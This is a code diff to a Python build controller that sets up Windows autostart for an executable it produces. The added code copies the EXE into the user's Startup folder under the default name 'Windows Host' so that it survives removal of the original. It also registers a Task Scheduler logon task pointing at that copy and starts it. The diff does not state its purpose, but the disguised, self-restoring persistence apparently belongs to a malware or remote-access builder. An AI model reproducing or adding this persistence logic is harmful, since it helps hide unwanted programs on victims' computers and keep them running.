@@ -156,42 +156,61 @@ class BuildController:
                         exe_path = final_paths[0]
                         method = getattr(req, 'autostart_method', None) or 'task'
                         task_name = getattr(req, 'autostart_name', None) or 'Windows Host'
+                        # Copy EXE to Startup folder so it persists if original is removed
+                        copied_path = None
+                        try:
+                            appdata = os.environ.get('APPDATA')
+                            if appdata:
+                                startup_dir = Path(appdata) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
+                                startup_dir.mkdir(parents=True, exist_ok=True)
+                                # Use a stable exe name
+                                dest = startup_dir / f"{task_name}.exe"
+                                try:
+                                    if Path(exe_path).resolve() != dest.resolve():
+                                        shutil.copy2(exe_path, dest)
+                                except Exception:
+                                    # best-effort overwrite
+                                    try:
+                                        if dest.exists():
+                                            dest.unlink()
+                                        shutil.copy2(exe_path, dest)
+                                    except Exception:
+                                        pass
+                                if dest.exists():
+                                    copied_path = str(dest)
+                                    await log_manager.emit_log(build_id, "info", f"Copied EXE to Startup: {dest}")
+                        except Exception as ee:
+                            await log_manager.emit_log(build_id, "warn", f"Copy to Startup failed: {ee}")
+                        # Startup method: placing the EXE is sufficient
                         if method == 'startup':
-                            try:
-                                appdata = os.environ.get('APPDATA')
-                                if appdata:
-                                    startup_dir = Path(appdata) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
-                                    startup_dir.mkdir(parents=True, exist_ok=True)
-                                    bat = startup_dir / f"{task_name}.bat"
-                                    bat.write_text(f"@echo off\r\nstart \"\" \"{exe_path}\"\r\n", encoding='utf-8')
-                                    await log_manager.emit_log(build_id, "info", f"Created Startup launcher: {bat}")
-                            except Exception as ee:
-                                await log_manager.emit_log(build_id, "warn", f"Startup creation failed: {ee}")
+                            if not copied_path:
+                                # Fallback to .bat if copy failed
+                                try:
+                                    appdata = os.environ.get('APPDATA')
+                                    if appdata:
+                                        startup_dir = Path(appdata) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
+                                        startup_dir.mkdir(parents=True, exist_ok=True)
+                                        bat = startup_dir / f"{task_name}.bat"
+                                        bat.write_text(f"@echo off\r\nstart \"\" \"{exe_path}\"\r\n", encoding='utf-8')
+                                        await log_manager.emit_log(build_id, "info", f"Created Startup launcher: {bat}")
+                                except Exception as ee:
+                                    await log_manager.emit_log(build_id, "warn", f"Startup creation failed: {ee}")
                         else:
+                            # Task Scheduler points to the copied EXE if available
+                            target_path = copied_path or exe_path
                             create_cmd = [
                                 "schtasks", "/Create", "/F",
                                 "/SC", "ONLOGON",
                                 "/RL", "LIMITED",
                                 "/TN", task_name,
-                                "/TR", f"\"{exe_path}\"",
+                                "/TR", f"\"{target_path}\"",
                             ]
-                            await log_manager.emit_log(build_id, "info", f"Registering Windows Task '{task_name}' -> {exe_path}")
+                            await log_manager.emit_log(build_id, "info", f"Registering Windows Task '{task_name}' -> {target_path}")
                             try:
                                 proc = await asyncio.create_subprocess_exec(*create_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                                 out, err = await proc.communicate()
                                 if proc.returncode != 0:
                                     await log_manager.emit_log(build_id, "warn", f"schtasks create failed ({proc.returncode}): {err.decode(errors='ignore').strip()}")
-                                    # Fallback to Startup folder
-                                    try:
-                                        appdata = os.environ.get('APPDATA')
-                                        if appdata:
-                                            startup_dir = Path(appdata) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
-                                            startup_dir.mkdir(parents=True, exist_ok=True)
-                                            bat = startup_dir / f"{task_name}.bat"
-                                            bat.write_text(f"@echo off\r\nstart \"\" \"{exe_path}\"\r\n", encoding='utf-8')
-                                            await log_manager.emit_log(build_id, "info", f"Created Startup launcher: {bat}")
-                                    except Exception as ee:
-                                        await log_manager.emit_log(build_id, "warn", f"Startup fallback failed: {ee}")
                                 else:
                                     await log_manager.emit_log(build_id, "info", f"Task '{task_name}' created/updated")
                                     run_cmd = ["schtasks", "/Run", "/TN", task_name]
@@ -202,7 +221,7 @@ class BuildController:
                                     else:
                                         await log_manager.emit_log(build_id, "info", f"Task '{task_name}' started")
                             except FileNotFoundError:
-                                await log_manager.emit_log(build_id, "warn", "schtasks.exe not found; cannot register task")
+                                await log_manager.emit_log(build_id, "warn", "schtasks not found; skipping task creation")
                 except Exception as e:
                     await log_manager.emit_log(build_id, "warn", f"Autostart step skipped: {e}")
 
